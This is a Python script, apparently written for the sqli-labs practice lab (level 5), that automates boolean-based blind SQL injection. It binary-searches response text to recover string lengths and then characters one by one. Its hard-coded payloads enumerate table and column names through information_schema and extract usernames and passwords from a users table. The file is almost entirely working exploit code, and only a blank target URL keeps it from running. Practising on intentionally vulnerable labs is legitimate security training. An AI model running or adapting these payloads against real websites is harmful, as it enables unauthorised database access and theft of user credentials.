import requests
import time

url = ''
return_key = 'You are in'


# 请求头，有时候需要
headers = {
    '': ''  # 身份验证，用户名和密码
}


def sql_str_lens(header, payload_lens, max_len=99):
    # payload中需要包含一个{}来逐个尝试不同的长度
    # 爆破某字符串的长度，长度最大限制为99
    """
    # 顺序查找 从长度为1开始找起
    for len_i in range(1, max_len + 1):
        lens_res = requests.get(url + payload_lens.format(len_i), headers=header)
        if return_key in lens_res.text:
            return len_i
    """
    # 二分查找，范围是1~99
    if return_key in requests.get(url + payload_lens.format(max_len + 1), headers=header).text:
        return 'Too lang! (Length exceeds limit)'  # 太长了
    low = 1
    high = max_len + 1
    mid = (low + high) // 2
    while low < high:
        lens_res = requests.get(url + payload_lens.format(mid), headers=header)
        if return_key in lens_res.text:
            low = mid + 1
        else:
            high = mid

        mid = (low + high) // 2

    return mid


def sql_str_content(header, str_len_cont, payload_con, is_show=False, cut_len=99):
    result_content = ''
    if not cut_len == 99:
        # 如果手动指定了“只爆破前多少位”，就进行下面的替换
        str_len_cont = cut_len

    # 二分查找
    for i in range(1, str_len_cont + 1):
        low = 32
        high = 128
        mid = (low + high) // 2

        while low < high:
            res = requests.get(url + payload_con.format(i, mid), headers=header)
            # time.sleep(0.2)

            if return_key in res.text:
                low = mid + 1
            else:
                high = mid

            mid = (low + high) // 2

        if mid == 32 or mid == 127:
            print('b')
            break

        result_content = result_content + chr(mid)

        if is_show:
            print(result_content)
        else:
            print('.', end='')
    print()
    return result_content


def sql_len_to_content(header, payload_lens, payload_cons, max_lens=99, cut_len=99):
    # 进一步封装
    # cut_len用于当字符串太长的时候，只爆破前多少位，其长度应小于或等于字符串长度
    str_len_big = sql_str_lens(header=header, payload_lens=payload_lens, max_len=max_lens)
    if cut_len and cut_len > str_len_big:
        return 'cut_len too lang, remove it or select a shorter one'
    result_big = sql_str_content(header=header, str_len_cont=str_len_big, payload_con=payload_cons, cut_len=cut_len)
    return result_big


# 使用方法：先更新长度payload_length，再查询具体内容


# sqli labs 第五关

# 爆破数据库中的表名
# 长度 29
payload_len = '''?id=-1' or length((select group_concat(table_name) from information_schema.tables where table_schema=database()))>{}-- -'''
payload = '''?id=-1' or ascii(substr(((select group_concat(table_name) from information_schema.tables where table_schema=database())),{},1))>{}-- -'''

results = sql_len_to_content(header=headers, payload_lens=payload_len, payload_cons=payload)
print(results)

# 爆破users表中的字段名
# 长度13
payload_len = '''?id=-1' or length((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'))>{}-- -'''
payload = '''?id=-1' or ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users'),{},1))>{}-- -'''

results = sql_len_to_content(header=headers, payload_lens=payload_len, payload_cons=payload)
print(results)

# users表内容，返回字符串长度较长
payload_len = '''?id=-1' or length((select group_concat(concat(username,0x23,password)) from users))>{}-- -'''
payload = '''?id=-1' or ascii(substr((select group_concat(concat(username,0x23,password)) from users),{},1))>{}-- -'''

# results = sql_len_to_content(header=headers, payload_lens=payload_len, payload_cons=payload, max_lens=200)   # 增加爆破长度
results = sql_len_to_content(header=headers, payload_lens=payload_len, payload_cons=payload, cut_len=20)    # 只爆破前多少位
print(results)
